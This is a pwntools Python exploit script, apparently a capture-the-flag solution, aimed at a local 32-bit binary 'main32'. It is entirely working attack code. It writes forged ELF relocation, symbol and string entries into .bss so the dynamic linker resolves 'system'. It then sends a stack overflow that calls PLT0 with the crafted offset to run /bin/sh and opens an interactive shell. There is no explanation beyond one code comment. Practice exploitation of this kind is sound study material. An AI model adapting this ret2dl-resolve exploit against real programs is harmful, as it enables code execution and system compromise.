from pwn import *
context(os='linux', arch='i386', log_level='debug')

p = process('./main32')
elf = ELF('./main32')

def main():
    raw_input()
    pop_ret = 0x08048355
    bss_data = 0x804a040 + 0x800 # !!!
    string_table = 0x804824c
    symtab = 0x80481cc
    reloctab = 0x804831c
    reloc_r_offset = 0x804a010
    plt_0 = 0x8048360
    versym = 0x80482d2

    aligned_offset = bss_data - symtab + 0x100
    alignment = 0x10 - (aligned_offset) % 0x10
    aligned_offset += alignment

    reloc_r_info = ((aligned_offset >> 4) << 8) | 7 # sym = symtab[reloc->r_info];
    reloc_struct = p32(reloc_r_offset) + p32(reloc_r_info)
    sym_struct = p32(bss_data + 0x200 - string_table + alignment) + p32(0) + p32(0) + p32(0x12)
    string = 'system\x00'

    p.recvuntil('bss:')
    payload = 'a' * 0x800 + reloc_struct.ljust(0x100, '\x00') + 'b' * alignment + sym_struct.ljust(0x100, '\x00') + string.ljust(0x100, '\x00') + '/bin/sh\x00'
    p.send(payload)

    p.recvuntil('stack:')
    offset = bss_data - reloctab
    payload = 'a' * 22 + p32(plt_0) + p32(offset) + p32(pop_ret) + p32(bss_data + 0x300 + alignment)
    p.send(payload)
    
    p.interactive()

if __name__ == '__main__':
    main()
